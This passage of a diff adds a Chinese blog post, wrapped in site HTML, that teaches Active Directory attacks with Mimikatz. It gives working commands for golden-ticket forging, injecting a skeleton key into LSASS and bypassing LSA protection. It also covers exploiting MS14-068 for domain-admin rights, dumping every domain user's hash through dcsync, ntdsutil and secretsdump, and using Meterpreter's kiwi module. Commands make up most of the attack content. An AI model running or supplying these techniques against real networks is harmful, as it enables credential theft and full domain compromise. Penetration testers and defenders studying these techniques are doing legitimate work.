+kerberos::golden /domain:test.com /sid: x-x-x-x-x-x /target:DC.test.com /rc4:xxxxxxxx /service:cifs /user:test /ptt
+
+#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统
+dir \\DC.test.com\C$
+</code></pre>
+<h5 id="3-skeleton-key"><a href="#3-skeleton-key" class="headerlink" title="3. skeleton key"></a>3. skeleton key</h5><p><strong>skeleton key（万能钥匙）</strong>，给所有用户添加了一个额外的密码，默认注入密码为<code>mimikatz</code>。需要在DC上以管理员权限运行。</p>
+<p>原理：将skeleton密钥注入到LSASS进程内存中，DC重启后失效。</p>
+<pre><code class="shell">#在域控上安装 skeleton key
+privilege::debug &quot;misc::skeleton&quot;
+
+#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz
+net use \\域控\c$ mimikatz /user:test \administrator
+</code></pre>
+<p><strong>LSA 保护策略</strong>：微软2014年在注册表项中添加的策略，用来防止对进程 lsass.exe 的代码注入，这时如果再尝试就会报错。</p>
+<p>可以在Mimikatz配置有<code>miidrv.sys</code>时进行绕过：</p>
+<pre><code class="shell">privilege::debug
+!+
+!processprotect /process:lsass.exe /remove
+misc::skeleton
+</code></pre>
+<h5 id="4-MS14-068漏洞"><a href="#4-MS14-068漏洞" class="headerlink" title="4. MS14-068漏洞"></a>4. MS14-068漏洞</h5><p>当我们拿到一个普通域成员账号后，如果域控服务器存在<code>MS14-068</code>漏洞并且未打补丁，则可以利用该漏洞直接获取域控权限。</p>
+<p>该漏洞补丁编号为<code>KB3011780</code>。可通过以下命令在DC机上自行检查：</p>
+<pre><code class="shell">systeminfo |find &quot;3011780&quot;    #查看是否打了该漏洞对应补丁
+</code></pre>
+<p><strong>MS14-068漏洞利用过程</strong>：</p>
+<pre><code class="shell">#查看当前用户SID值
+whoami /user
+
+#利用 ms14-068 生成TGT票据
+MS14-068.exe -u 域用户@域名 -p 域用户密码 -s 域用户SID值 -d 域控ip
+#该命令会生成 .cache 后缀的票据文件
+
+#在Mimikatz中导入该票据
+kerberos::ptc 票据文件
+
+#查看凭证列表
+klist 
+
+#查看文件测试
+dir \\x.x.x.x\c$
+</code></pre>
+<h4 id="五、获取域控中域成员hash"><a href="#五、获取域控中域成员hash" class="headerlink" title="五、获取域控中域成员hash"></a>五、获取域控中域成员hash</h4><p>前提：已经拿下域控DC，在域控上以与管理员身份执行Mimikatz。</p>
+<p><strong>ntds.dit</strong>：(也被称为Active Directory database）包含了当前域用户中所有的用户的账号信息和其HASH值。</p>
+<p>ntds.dit文件一般位置: <code>C:\Windows\NTDS\NTDS.dit</code>。</p>
+<h5 id="1-域控本地运行"><a href="#1-域控本地运行" class="headerlink" title="1. 域控本地运行"></a>1. 域控本地运行</h5><p>直接执行</p>
+<pre><code class="shell">privilege::debug
+lsadump::lsa /patch
+</code></pre>
+<p>通过dcsync利用目录复制服务(DRS)从NTDS.DIT文件中检索密码哈希值：</p>
+<pre><code class="shell">#获取所有域用户
+lsadump::dcsync /domain:test.com /all /csv
+
+#指定获取某个用户的hash
+lsadump::dcsync /domain:test.com /user:test
+</code></pre>
+<h5 id="2-导出hash并读取"><a href="#2-导出hash并读取" class="headerlink" title="2. 导出hash并读取"></a>2. 导出hash并读取</h5><p>这里可以借助 <code>ntdsutil.exe</code> ，域控自带的域数据库管理工具，导出域数据库：</p>
+<pre><code class="shell">#创建快照
+ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit
+
+#加载快照
+ntdsutil snapshot &quot;mount &#123;68925c07-9201-4c1a-8aaa-adb27dfd1ff8&#125;&quot; quit quit
+
+#Copy文件副本
+copy C:\$SNAP_202110061330_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
+</code></pre>
+<p>将ntds.dit文件拷贝到本地利用impacket脚本<code>secretsdump.py</code>出Hash：</p>
+<pre><code class="shell">secretsdump.exe -ntds.dit -system system.hive LOCAL
+</code></pre>
+<h5 id="3-利用secretsdump脚本直接导出"><a href="#3-利用secretsdump脚本直接导出" class="headerlink" title="3. 利用secretsdump脚本直接导出"></a>3. 利用secretsdump脚本直接导出</h5><pre><code class="shell">python secretsdump.py rabbitmask:123456@192.168.15.181
+</code></pre>
+<p>首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功。</p>
+<h4 id="六、msf中kiwi模块使用"><a href="#六、msf中kiwi模块使用" class="headerlink" title="六、msf中kiwi模块使用"></a>六、msf中kiwi模块使用</h4><p>注意：msf中加载kiwi模块默认是32位，如果目标主机为64位，需先将进程迁移到64位的进程中。</p>
+<pre><code class="shell">#meterpreter会话下
+load kiwi    #加载kiwi模块
+help kiwi    
+</code></pre>
+<p>列举系统中的明文密码：</p>
+<pre><code class="undefined">creds_all
+</code></pre>
+<p>使用Mimikatz中的所有功能：</p>
+<pre><code class="shell">#kiwi_cmd命令需要接上mimikatz的命令，即可使用Mimikatz中的所有功能
+kikiwi_cmd sekurlsa::logonpasswords
+</code></pre>
+<p>贴一些kiwi模块命令：</p>
+<pre><code class="shell">creds_all               #列举所有凭据
+creds_kerberos          #列举所有kerberos凭据
+creds_msv               #列举所有msv凭据
+creds_ssp               #列举所有ssp凭据
+creds_tspkg             #列举所有tspkg凭据
+creds_wdigest           #列举所有wdigest凭据
+dcsync                  #通过DCSync检索用户帐户信息
+dcsync_ntlm             #通过DCSync检索用户帐户NTLM散列、SID和RID
+golden_ticket_create    #创建黄金票据
+kerberos_ticket_list    #列举kerberos票据
+kerberos_ticket_purge   #清除kerberos票据
+kerberos_ticket_use     #使用kerberos票据
+kiwi_cmd                #执行mimikatz的命令，后面接mimikatz.exe的命令
+lsa_dump_sam            #dump出lsa的SAM
+lsa_dump_secrets        #dump出lsa的密文
+password_change         #修改密码
+wifi_list               #列出当前用户的wifi配置文件
+wifi_list_shared        #列出共享wifi配置文件/编码
+</code></pre>
+<h4 id="七、杂项命令"><a href="#七、杂项命令" class="headerlink" title="七、杂项命令"></a>七、杂项命令</h4><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr。此时除了改回配置，还可以借助Mimikatz的一些杂项模块功能：</p>
+<pre><code class="shell">privilege::debug
+
+#这三个命令在管理员禁止使用这三个东西的时候可以硬开出来
+misc::cmd         #开启cmd命令行
+misc::taskmgr     #开启任务管理器
+misc::regedit     #开启注册表编辑器
+</code></pre>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/113348310">https://blog.csdn.net/weixin_40412037/article/details/113348310</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.z3ratu1.cn/Mimikatz%E4%BD%BF%E7%94%A8%E7%AE%80%E7%95%A5.html">https://blog.z3ratu1.cn/Mimikatz%E4%BD%BF%E7%94%A8%E7%AE%80%E7%95%A5.html</a></p>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -893,7 +406,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
         		</li>
       		
 		</ul>
@@ -902,16 +415,84 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/29/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2022/03/01/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          linux应急响应
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/01/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">内网渗透</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -931,8 +512,14 @@
 
 
 
+  
+  
+  
 
   
+
+  
+
   
 
 
@@ -955,8 +542,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
